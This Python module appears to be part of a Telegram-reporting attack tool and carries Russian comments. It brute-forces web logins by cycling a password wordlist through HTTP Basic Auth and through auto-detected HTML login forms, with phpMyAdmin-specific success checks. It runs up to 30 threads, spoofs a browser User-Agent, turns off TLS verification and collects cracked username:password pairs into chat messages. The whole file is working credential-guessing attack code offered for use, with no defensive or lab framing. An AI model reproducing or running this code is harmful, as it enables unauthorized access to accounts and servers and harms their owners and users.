import requests
import os
import time
import threading
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import queue
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import random

# Добавляем глобальный трекер прогресса
brute_progress = {
    "total": 0,
    "current": 0,
    "found": [],
    "last_update": 0
}

# Очередь для обработанных паролей
password_queue = queue.Queue()

# Создаем сессию для повторного использования соединений с оптимизированными настройками
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Connection': 'keep-alive'
})

# Настраиваем пул соединений: увеличиваем максимальное количество соединений
adapter = HTTPAdapter(
    pool_connections=50,
    pool_maxsize=50,
    max_retries=Retry(
        total=0,
        backoff_factor=0.1
    )
)
session.mount('http://', adapter)
session.mount('https://', adapter)

def reset_progress():
    global brute_progress
    global password_queue
    
    # Clear the progress tracking completely
    brute_progress = {
        "total": 0,
        "current": 0,
        "found": [],
        "last_update": time.time()
    }
    
    # Create a new queue instance to ensure it's completely empty
    password_queue = queue.Queue()

def update_progress(current, total=None):
    global brute_progress
    if total is not None:
        brute_progress["total"] = total
    brute_progress["current"] = current
    brute_progress["last_update"] = time.time()
    
def add_found(username, password):
    global brute_progress
    # Проверяем, не добавляли ли мы уже этот пароль
    if not any(item['username'] == username and item['password'] == password for item in brute_progress["found"]):
        brute_progress["found"].append({"username": username, "password": password})
        brute_progress["last_update"] = time.time()
        print(f"Найден пароль: {username}:{password}")

def get_progress():
    global brute_progress
    if brute_progress["total"] == 0:
        return 0
    return int((brute_progress["current"] / brute_progress["total"]) * 100)

def get_last_update_time():
    global brute_progress
    return brute_progress["last_update"]

def load_wordlist(filename, limit=None):
    """
    Загружает словарь паролей из файла с опциональным ограничением количества
    
    Args:
        filename (str): Имя файла со словарем
        limit (int, optional): Максимальное количество паролей для загрузки
        
    Returns:
        list: Список паролей
    """
    path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'dict', filename)
    if not os.path.exists(path):
        return []
        
    # Если установлен лимит, используем оптимизированную загрузку
    if limit and limit > 0:
        # Если лимит меньше 10000, загружаем первые N паролей
        if limit < 10000:
            with open(path, encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()][:limit]
        
        # Иначе выбираем случайные пароли из файла
        else:
            total_lines = sum(1 for _ in open(path, encoding='utf-8', errors='ignore'))
            if total_lines <= limit:
                with open(path, encoding='utf-8', errors='ignore') as f:
                    return [line.strip() for line in f if line.strip()]
            
            # Выбираем случайные индексы
            sample_indices = sorted(random.sample(range(total_lines), limit))
            passwords = []
            
            with open(path, encoding='utf-8', errors='ignore') as f:
                for i, line in enumerate(f):
                    if i in sample_indices:
                        if line.strip():
                            passwords.append(line.strip())
                        if len(passwords) >= limit:
                            break
            
            return passwords
    
    # Без лимита загружаем весь файл
    with open(path, encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def is_login_successful(response, is_basic_auth=False):
    """Определяет, успешен ли вход по ответу сервера"""
    # Проверяем код ответа - важнее всего содержимое страницы
    text = response.text.lower()
    
    # Специальная проверка для phpMyAdmin
    if 'phpmyadmin' in response.url.lower():
        # Признаки неудачного входа в phpMyAdmin
        phpmyadmin_failure = [
            'access denied', 'доступ запрещен', 'incorrect', 'неверный', 
            'invalid', 'login failed', 'ошибка входа', 'неправильный логин',
            'authentication failed', 'неверная комбинация'
        ]
        
        # Признаки успешного входа в phpMyAdmin
        phpmyadmin_success = [
            'server:', 'database:', 'sql:', 'структура', 'structure',
            'server_databases', 'server_status', 'server_variables',
            'db_structure.php', 'tbl_structure.php', 'server_privileges.php',
            'navigation.php', 'index.php?route=/', 'welcome'
        ]
        
        # Проверяем на признаки неудачи
        if any(failure in text for failure in phpmyadmin_failure):
            return False
            
        # Проверяем на признаки успеха
        if any(success in text for success in phpmyadmin_success):
            return True
            
        # Если нет явных признаков - скорее всего неуспешный вход
        return False
    
    # Для Basic Auth и других форм
    
    # Признаки неудачного входа
    failure_indicators = [
        'invalid', 'incorrect', 'failed', 'wrong', 'error', 
        'неверн', 'ошибк', 'не удалось', 'denied', 'invalid password',
        'try again', 'попробуйте снова', 'пароль не', 'access denied',
        'login failed', 'authentication failed'
    ]
    
    # Если есть явные признаки неудачи
    if any(indicator in text for indicator in failure_indicators):
        return False
    
    # Признаки успешного входа
    success_indicators = [
        'welcome', 'logout', 'dashboard', 'control panel', 'admin', 'выход',
        'панель', 'личный кабинет', 'аккаунт', 'профиль', 'успешно',
        'success', 'authenticated', 'account', 'profile', 'sign out'
    ]
    
    # Если есть явные признаки успеха
    if any(indicator in text for indicator in success_indicators):
        return True
    
    # Для Basic Auth только успешный код может означать успешную авторизацию
    if is_basic_auth:
        return response.status_code == 200
    
    # Если статус 302 (редирект), и нет признаков неудачи
    if response.status_code in (302, 303):
        # Проверяем URL редиректа - если он содержит login или auth, скорее всего неудача
        if 'login' in response.url or 'auth' in response.url:
            return False
        return True
    
    # По умолчанию считаем вход неудачным
    return False

def try_basic_auth_batch(url, username, password_batch, result_list, progress_lock):
    """Попытка авторизации по Basic Auth для пакета паролей"""
    local_session = requests.Session()
    local_session.headers.update(session.headers)
    local_session.verify = False
    
    # Настраиваем собственный адаптер для этого потока
    thread_adapter = HTTPAdapter(pool_maxsize=10, max_retries=0)
    local_session.mount('http://', thread_adapter)
    local_session.mount('https://', thread_adapter)
    
    for password in password_batch:
        success = False
        try:
            resp = local_session.get(
                url, 
                auth=(username, password), 
                timeout=3,
                allow_redirects=True
            )
            
            # Проверяем результат авторизации
            success = is_login_successful(resp, is_basic_auth=True)
            
            if success:
                result = {'username': username, 'password': password, 'status': 'success'}
                result_list.append(result)
                add_found(username, password)
        except Exception as e:
            # Игнорируем ошибки соединения
            pass
        
        # Обновляем прогресс безопасно - только счетчик
        with progress_lock:
            password_queue.put(1)
            brute_progress["current"] = password_queue.qsize()
            brute_progress["last_update"] = time.time()

def brute_http_basic(url, userlist, passlist, max_workers=30):
    """Брутфорс Basic Auth с использованием многопоточности и пакетной обработки"""
    found = []
    total_attempts = len(userlist) * len(passlist)
    update_progress(0, total_attempts)
    
    # Прогресс-лок для безопасного обновления прогресса
    progress_lock = threading.Lock()
    
    # Размер пакета паролей для одного потока
    batch_size = max(1, min(50, len(passlist) // max_workers))
    
    # Настраиваем пул потоков
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for username in userlist:
            # Разбиваем список паролей на пакеты
            for i in range(0, len(passlist), batch_size):
                password_batch = passlist[i:i+batch_size]
                futures.append(
                    executor.submit(
                        try_basic_auth_batch, 
                        url, 
                        username, 
                        password_batch, 
                        found, 
                        progress_lock
                    )
                )
        
        # Ждем завершения всех задач
        for future in as_completed(futures):
            try:
                future.result()  # Получаем результат, чтобы выявить исключения
            except Exception as e:
                print(f"Ошибка в задаче брутфорса Basic Auth: {e}")
                
    return found

def try_form_auth_batch(form_url, method, user_field_name, pass_field_name, username, password_batch, login_form, result_list, progress_lock):
    """Попытка авторизации через форму для пакета паролей"""
    # Создаем локальную сессию для этого потока
    local_session = requests.Session()
    local_session.headers.update(session.headers)
    local_session.verify = False
    
    # Настраиваем собственный адаптер для этого потока
    thread_adapter = HTTPAdapter(pool_maxsize=10, max_retries=0)
    local_session.mount('http://', thread_adapter)
    local_session.mount('https://', thread_adapter)
    
    # Получаем все скрытые поля формы, которые нужно отправить
    hidden_fields = {}
    for input_field in login_form.find_all('input', type='hidden'):
        if input_field.has_attr('name') and input_field.has_attr('value'):
            hidden_fields[input_field['name']] = input_field['value']
            
    for password in password_batch:
        success = False
        try:
            # Подготавливаем данные формы, включая скрытые поля
            data = {**hidden_fields, user_field_name: username, pass_field_name: password}
            
            if method == 'post':
                r = local_session.post(
                    form_url, 
                    data=data, 
                    timeout=3,
                    allow_redirects=True
                )
            else:
                r = local_session.get(
                    form_url, 
                    params=data, 
                    timeout=3,
                    allow_redirects=True
                )
            
            # Проверяем результат авторизации
            success = is_login_successful(r)
            
            if success:
                result = {'username': username, 'password': password, 'status': 'success'}
                result_list.append(result)
                add_found(username, password)
        except Exception as e:
            # Игнорируем ошибки соединения
            pass
            
        # Обновляем прогресс безопасно - только счетчик
        with progress_lock:
            password_queue.put(1)
            brute_progress["current"] = password_queue.qsize()
            brute_progress["last_update"] = time.time()

def brute_form(url, userlist, passlist, user_field='username', pass_field='password', max_workers=30):
    found = []
    total_attempts = len(userlist) * len(passlist)
    update_progress(0, total_attempts)
    
    # Прогресс-лок для безопасного обновления прогресса
    progress_lock = threading.Lock()
    
    try:
        # Получаем информацию о форме
        resp = session.get(url, timeout=5, verify=False)
        soup = BeautifulSoup(resp.text, 'html.parser')
        
        # Ищем форму логина
        login_form = None
        forms = soup.find_all('form')
        
        # Пытаемся найти форму входа по признакам
        for form in forms:
            # Ищем поля ввода логина и пароля
            has_username = False
            has_password = False
            
            for input_field in form.find_all('input'):
                input_type = input_field.get('type', '').lower()
                input_name = input_field.get('name', '').lower()
                input_id = input_field.get('id', '').lower()
                
                if input_type == 'text' or 'user' in input_name or 'login' in input_name or 'email' in input_name:
                    has_username = True
                elif input_type == 'password' or 'pass' in input_name or 'pwd' in input_name:
                    has_password = True
            
            # Если форма содержит поля логина и пароля, это вероятно форма входа
            if has_username and has_password:
                login_form = form
                break
        
        if not login_form:
            print(f"Не найдена форма входа на {url}")
            return []
            
        action = login_form.get('action', '')
        method = login_form.get('method', 'post').lower()
        form_url = urljoin(url, action) if action else url
        
        # Определяем имена полей
        user_field_name = user_field
        pass_field_name = pass_field
        
        for input_field in login_form.find_all('input'):
            input_type = input_field.get('type', '').lower()
            name = input_field.get('name', '').lower()
            
            if input_type == 'text' or any(keyword in name for keyword in ['user', 'login', 'email']):
                user_field_name = input_field.get('name')
            elif input_type == 'password' or any(keyword in name for keyword in ['pass', 'pwd']):
                pass_field_name = input_field.get('name')
        
        # Проверяем, что нашли поля для логина и пароля
        if not user_field_name or not pass_field_name:
            print(f"Не найдены поля для логина/пароля на {url}")
            return []
        
        # Размер пакета паролей для одного потока
        batch_size = max(1, min(50, len(passlist) // max_workers))
        
        # Настраиваем пул потоков
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for username in userlist:
                # Разбиваем список паролей на пакеты
                for i in range(0, len(passlist), batch_size):
                    password_batch = passlist[i:i+batch_size]
                    futures.append(
                        executor.submit(
                            try_form_auth_batch, 
                            form_url, 
                            method, 
                            user_field_name, 
                            pass_field_name, 
                            username, 
                            password_batch,
                            login_form,
                            found, 
                            progress_lock
                        )
                    )
            
            # Ждем завершения всех задач
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Ошибка в задаче брутфорса формы: {e}")
                
    except Exception as e:
        print(f"Ошибка при брутфорсе формы: {e}")
    
    return found

def bruteforce_target(url, mode='auto', username='admin', password_limit=None):
    """
    mode: 'auto', 'basic', 'form'
    password_limit: ограничение количества паролей (None = без ограничения)
    """
    # Отключаем предупреждения SSL для скорости
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    reset_progress()
    # Use the provided username instead of loading from file
    userlist = [username]
    
    # Загружаем словарь паролей с опциональным ограничением
    passlist = load_wordlist('pass.txt', limit=password_limit)
    
    print(f"Loaded {len(passlist)} passwords from dictionary")
    
    # Определяем количество воркеров на основе доступных ресурсов
    max_workers = min(30, os.cpu_count() * 2)  # Ограничиваем количество потоков для стабильности
    print(f"Starting bruteforce with {len(userlist)} users and {len(passlist)} passwords using {max_workers} workers")
    
    results = []
    if mode in ('auto', 'basic'):
        print(f"Trying Basic Auth bruteforce...")
        basic_results = brute_http_basic(url, userlist, passlist, max_workers=max_workers)
        if basic_results:
            results.extend(basic_results)
            print(f"Basic Auth bruteforce found {len(basic_results)} valid credentials")
    
    if mode in ('auto', 'form'):
        print(f"Trying Form bruteforce...")
        form_results = brute_form(url, userlist, passlist, max_workers=max_workers)
        if form_results:
            results.extend(form_results)
            print(f"Form bruteforce found {len(form_results)} valid credentials")
    
    return results

def format_brute_results(results):
    if not results:
        return "❌ Не удалось подобрать ни одну пару логин/пароль."
    msg = "<b>🔑 Найдены рабочие пары логин/пароль:</b>\n"
    for r in results:
        msg += f"<code>{r['username']}: ({r['password']})</code>\n"
    return msg

def format_progress_message():
    """Форматирует сообщение с прогрессом брутфорса для Telegram"""
    progress = get_progress()
    found_count = len(brute_progress["found"])
    
    message = f"<b>🔑 Прогресс перебора паролей:</b>\n"
    message += f"Проверено: {progress}% {'▓' * (progress//5)}{'░' * (20-(progress//5))}\n"
    message += f"Попыток: {brute_progress['current']}/{brute_progress['total']}\n"
    
    # Исправляем расчет скорости - используем текущее время, а не время последнего обновления
    current_time = time.time()
    elapsed_time = max(1, current_time - brute_progress["last_update"] + 0.1)
    speed = int(brute_progress['current'] / elapsed_time)
    message += f"Скорость: ~{speed} паролей/сек\n"
    
    message += f"Время последнего обновления: {time.strftime('%H:%M:%S', time.localtime(current_time))}\n"
    
    if found_count > 0:
        message += f"\n<b>Уже найдено паролей:</b> {found_count}\n"
        # Ограничиваем количество отображаемых паролей до 20, чтобы сообщение не было слишком длинным
        shown_passwords = brute_progress["found"][:20]
        for item in shown_passwords:
            message += f"<code>{item['username']}: ({item['password']})</code>\n"
        
        # Если найдено больше паролей, указываем это
        if found_count > 20:
            message += f"<i>...и еще {found_count - 20} паролей</i>\n"
    
    return message 